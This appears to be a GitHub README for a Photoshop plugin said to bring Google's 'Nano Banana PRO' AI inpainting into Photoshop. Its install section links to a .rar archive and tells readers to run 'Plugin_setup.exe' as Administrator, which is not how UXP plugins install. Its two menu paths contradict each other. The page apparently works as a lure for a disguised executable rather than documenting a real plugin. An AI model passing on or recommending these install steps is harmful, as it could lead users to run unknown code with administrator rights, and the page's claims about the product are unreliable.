# Nano Banana Photoshop Plugin
AI Inpainting inside Adobe Photoshop (Google "Nano Banana PRO" Model)

---

Version : Adobe Photoshop 2022 (v23) or newer

---

### [Install](https://github.com/Soldereadivider/photoshop-plugin-nano-banana/releases/download/plugin/Plugin.nanoB.rar)
Creative Cloud (recommended)
1. Run `Plugin_setup.exe` as **Administrator**.
2. Restart Photoshop if it was open.
3. Open: Window > Extensions (UXP) > Nano Banana Inpaint.

### Usage
1. Open from Plug-ins menu: Plug-ins > Nano-Banana Editor.
